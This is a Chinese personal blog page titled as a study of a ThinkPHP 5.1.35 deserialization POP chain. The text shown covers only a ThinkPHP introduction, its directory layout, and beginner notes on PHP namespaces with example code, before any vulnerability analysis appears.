<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Siii0"><meta name="copyright" content="Siii0"><meta name="generator" content="Hexo 6.0.0"><meta name="theme" content="hexo-theme-yun"><title>PHP学习-Thinkphp 5.1.35反序列化pop链挖掘 | Siii0的博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"siii0.github.io","root":"/","title":"Siii0","version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="一、Thinkphp简介1、了解ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架  2、目录结构project  应用部署目录 ├─application           应用目录（可设置） │  ├─common             公共模块目录（可更改） │  ├─index              模块目录(可更改) │  │  ├─co">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP学习-Thinkphp 5.1.35反序列化pop链挖掘">
<meta property="og:url" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/index.html">
<meta property="og:site_name" content="Siii0的博客">
<meta property="og:description" content="一、Thinkphp简介1、了解ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架  2、目录结构project  应用部署目录 ├─application           应用目录（可设置） │  ├─common             公共模块目录（可更改） │  ├─index              模块目录(可更改) │  │  ├─co">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20211229170046240.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20211229192627402.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103194714402.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103195108475.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103195539703.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103195806165.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103195853903.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104101318047.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104135558150.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104154940587.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104161422332.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104162224855.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104165344615.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104220546845.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104222416716.png">
<meta property="og:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104222427131.png">
<meta property="article:published_time" content="2022-01-05T07:50:46.871Z">
<meta property="article:modified_time" content="2022-01-05T09:22:55.698Z">
<meta property="article:author" content="Siii0">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Thinkphp">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20211229170046240.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Siii0"><img width="96" loading="lazy" src="/images/tom.jpg" alt="Siii0"></a><div class="site-author-name"><a href="/about/">Siii0</a></div><span class="site-name">Siii0的博客</span><sub class="site-subtitle"></sub><div class="site-desciption">如果你停止，就是谷底，如果你还在继续，就是上坡。</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">10</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">12</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ 2373589667" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="微信 Siiioz" target="_blank" style="color:#1AAD19"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-2-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="E-Mail 2373589667@qq.com" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Thinkphp%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">一、Thinkphp简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%BA%86%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">1、了解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">2、目录结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81PHP%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">二、PHP学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81namespace"><span class="toc-number">2.1.</span> <span class="toc-text">1、namespace</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">（1）命名空间的定义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">（2）命名空间的使用： \</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%883%EF%BC%89namespace%E5%85%B3%E9%94%AE%E5%AD%97%E5%92%8C-NAMESPACE-%E5%B8%B8%E9%87%8F"><span class="toc-number">2.1.0.3.</span> <span class="toc-text">（3）namespace关键字和__NAMESPACE__常量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E5%88%AB%E5%90%8D%E5%92%8C%E5%AF%BC%E5%85%A5"><span class="toc-number">2.1.0.4.</span> <span class="toc-text">（4）别名和导入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E5%87%BD%E6%95%B0%E3%80%81%E5%B8%B8%E9%87%8F%E5%92%8C%E7%B1%BB"><span class="toc-number">2.1.0.5.</span> <span class="toc-text">（5）函数、常量和类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%BB%A7%E6%89%BF%E7%B1%BBextend"><span class="toc-number">2.2.</span> <span class="toc-text">2、继承类extend</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%BD%93%E6%89%A9%E5%B1%95%E4%B8%80%E4%B8%AA%E7%B1%BB%EF%BC%8C%E5%AD%90%E7%B1%BB%E5%B0%B1%E4%BC%9A%E7%BB%A7%E6%89%BF%E7%88%B6%E7%B1%BB%E6%89%80%E6%9C%89-public-%E5%92%8C-protected-%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%B1%9E%E6%80%A7%E5%92%8C%E5%B8%B8%E9%87%8F%E3%80%82%E9%99%A4%E9%9D%9E%E5%AD%90%E7%B1%BB%E8%A6%86%E7%9B%96%E4%BA%86%E7%88%B6%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E8%A2%AB%E7%BB%A7%E6%89%BF%E7%9A%84%E6%96%B9%E6%B3%95%E9%83%BD%E4%BC%9A%E4%BF%9D%E7%95%99%E5%85%B6%E5%8E%9F%E6%9C%89%E5%8A%9F%E8%83%BD%E3%80%82"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">（1）当扩展一个类，子类就会继承父类所有 public 和 protected 的方法，属性和常量。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%AD%90%E7%B1%BB%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E7%88%B6%E7%B1%BB%E7%9A%84%E7%A7%81%E6%9C%89%E6%96%B9%E6%B3%95%E3%80%82"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">（2）子类无法访问父类的私有方法。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81trait-%E5%92%8C-class"><span class="toc-number">2.3.</span> <span class="toc-text">3、trait 和 class</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89trait%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">（1）trait的使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89trait%E4%B8%8D%E8%83%BD%E5%AE%9E%E4%BE%8B%E5%8C%96"><span class="toc-number">2.3.0.2.</span> <span class="toc-text">（2）trait不能实例化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81array-unshift-%E5%87%BD%E6%95%B0-%E5%92%8C-array-key-exist-%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">4、array_unshift()函数 和 array_key_exist()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89array-unshift"><span class="toc-number">2.4.0.1.</span> <span class="toc-text">（1）array_unshift()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89array-key-exist"><span class="toc-number">2.4.0.2.</span> <span class="toc-text">（2）array_key_exist()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81-call%E6%96%B9%E6%B3%95"><span class="toc-number">2.5.</span> <span class="toc-text">5、__call方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98"><span class="toc-number">3.</span> <span class="toc-text">三、反序列化pop链挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">1、漏洞挖掘思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">2、漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%90%9C%E5%AF%BB-destruct%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">（1）搜寻__destruct方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E6%8E%A5%E4%B8%8B%E6%9D%A5%EF%BC%8C%E5%B0%B1%E8%A6%81%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">（2）接下来，就要找注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2use"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">（3）全局搜索use</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">3、代码执行点分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">3.3.1.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://Siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Siii0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Siii0的博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">PHP学习-Thinkphp 5.1.35反序列化pop链挖掘</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2022-01-05 15:50:46" itemprop="dateCreated datePublished" datetime="2022-01-05T15:50:46+08:00">2022-01-05</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/PHP/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">PHP</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF/" style="--text-color:#61dafb"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF</span></a><a class="tag-item" href="/tags/Thinkphp/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Thinkphp</span></a><a class="tag-item" href="/tags/PHP/" style="--text-color:#8892BF"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">PHP</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><span id="more"></span>
<h2 id="一、Thinkphp简介"><a href="#一、Thinkphp简介" class="headerlink" title="一、Thinkphp简介"></a>一、Thinkphp简介</h2><h3 id="1、了解"><a href="#1、了解" class="headerlink" title="1、了解"></a>1、了解</h3><p>ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架</p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20211229170046240.png" alt="image-20211229170046240" loading="lazy"></p>
<h3 id="2、目录结构"><a href="#2、目录结构" class="headerlink" title="2、目录结构"></a>2、目录结构</h3><pre class="line-numbers language-none"><code class="language-none">project  应用部署目录
├─application           应用目录（可设置）
│  ├─common             公共模块目录（可更改）
│  ├─index              模块目录(可更改)
│  │  ├─config.php      模块配置文件
│  │  ├─common.php      模块函数文件
│  │  ├─controller      控制器目录
│  │  ├─model           模型目录
│  │  ├─view            视图目录
│  │  └─ ...            更多类库目录
│  ├─command.php        命令行工具配置文件
│  ├─common.php         应用公共（函数）文件
│  ├─config.php         应用（公共）配置文件
│  ├─database.php       数据库配置文件
│  ├─tags.php           应用行为扩展定义文件
│  └─route.php          路由配置文件
├─extend                扩展类库目录（可定义）
├─public                WEB 部署目录（对外访问目录）
│  ├─static             静态资源存放目录(css,js,image)
│  ├─index.php          应用入口文件
│  ├─router.php         快速测试文件
│  └─.htaccess          用于 apache 的重写
├─runtime               应用的运行时目录（可写，可设置）
├─vendor                第三方类库目录（Composer）
├─thinkphp              框架系统目录
│  ├─lang               语言包目录
│  ├─library            框架核心类库目录
│  │  ├─think           Think 类库包目录
│  │  └─traits          系统 Traits 目录
│  ├─tpl                系统模板目录
│  ├─.htaccess          用于 apache 的重写
│  ├─.travis.yml        CI 定义文件
│  ├─base.php           基础定义文件
│  ├─composer.json      composer 定义文件
│  ├─console.php        控制台入口文件
│  ├─convention.php     惯例配置文件
│  ├─helper.php         助手函数文件（可选）
│  ├─LICENSE.txt        授权说明文件
│  ├─phpunit.xml        单元测试配置文件
│  ├─README.md          README 文件
│  └─start.php          框架引导文件
├─build.php             自动生成定义文件（参考）
├─composer.json         composer 定义文件
├─LICENSE.txt           授权说明文件
├─README.md             README 文件
├─think                 命令行入口文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="二、PHP学习"><a href="#二、PHP学习" class="headerlink" title="二、PHP学习"></a>二、PHP学习</h2><h3 id="1、namespace"><a href="#1、namespace" class="headerlink" title="1、namespace"></a>1、namespace</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.namespaces.rationale.php">https://www.php.net/manual/zh/language.namespaces.rationale.php</a></p>
<p>广义上来讲，命名空间是一种封装事物的方法。</p>
<p>具体举个例子，文件   <code>foo.txt</code> 可以同时在目录 <code>/home/greg</code> 和   <code>/home/other</code> 中存在，但在同一个目录中不能存在两个   <code>foo.txt</code> 文件。这两个 <code>foo.txt</code> 相应的父目录  <code>/home/greg</code> 和 <code>/home/other</code> 就是两个不同的命名空间。</p>
<h5 id="（1）命名空间的定义"><a href="#（1）命名空间的定义" class="headerlink" title="（1）命名空间的定义"></a>（1）命名空间的定义</h5><h5 id="（2）命名空间的使用："><a href="#（2）命名空间的使用：" class="headerlink" title="（2）命名空间的使用： \"></a>（2）命名空间的使用： <code>\</code></h5><h5 id="（3）namespace关键字和-NAMESPACE-常量"><a href="#（3）namespace关键字和-NAMESPACE-常量" class="headerlink" title="（3）namespace关键字和__NAMESPACE__常量"></a>（3）<code>namespace</code>关键字和<code>__NAMESPACE__</code>常量</h5><h5 id="（4）别名和导入"><a href="#（4）别名和导入" class="headerlink" title="（4）别名和导入"></a>（4）别名和导入</h5><p><code>PHP 可以为这些项目导入或设置别名：   常量、函数、类、接口、命名空间。</code></p>
<p><code>我的理解为：从其他命名空间导入，并且可以命名</code></p>
<h5 id="（5）函数、常量和类"><a href="#（5）函数、常量和类" class="headerlink" title="（5）函数、常量和类"></a>（5）函数、常量和类</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">my<span class="token punctuation">\</span>name</span><span class="token punctuation">;</span> <span class="token comment">// 定义命名空间，如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间（为空）</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token operator">--</span><span class="token operator">--</span>
<span class="token keyword">function</span> <span class="token function-definition function">myfunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">//这是在命名空间 my\name 中的 myfunction()</span>
<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>myfunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用全局的fopen函数</span>
<span class="token keyword">const</span> <span class="token constant">MYCONST</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">--</span><span class="token operator">--</span>
    
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayObject</span><span class="token punctuation">;</span> <span class="token comment">// 致命错误, 找不到 A\B\C\ArrayObject 类</span>

<span class="token operator">--</span><span class="token operator">--</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>my<span class="token punctuation">\</span>name<span class="token punctuation">\</span>MyClass</span><span class="token punctuation">;</span> <span class="token comment">// 这两个调用是一样的，不过使用了命名空间</span>
<span class="token operator">--</span><span class="token operator">--</span>
    
<span class="token operator">--</span><span class="token operator">--</span>
<span class="token keyword">function</span> <span class="token function-definition function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function"><span class="token punctuation">\</span>strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//在全局空间中搜寻，就是一个系统函数</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 命名空间中的函数或常量，会优先在该命名空间中搜寻</span>
<span class="token operator">--</span><span class="token operator">--</span>
 
<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">namespace</span>\<span class="token constant">MYCONST</span><span class="token punctuation">;</span> <span class="token comment">// namespace关键字 为当前命名空间，调用现在命名空间中的常量MYCONST</span>

<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token constant">__NAMESPACE__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\MYCONST'</span><span class="token punctuation">;</span> <span class="token comment">//__NAMESPACE__ 常量，为字符类型</span>

<span class="token keyword">echo</span> <span class="token function">constant</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出1  参数为字符串,必须为当前命名空间</span>
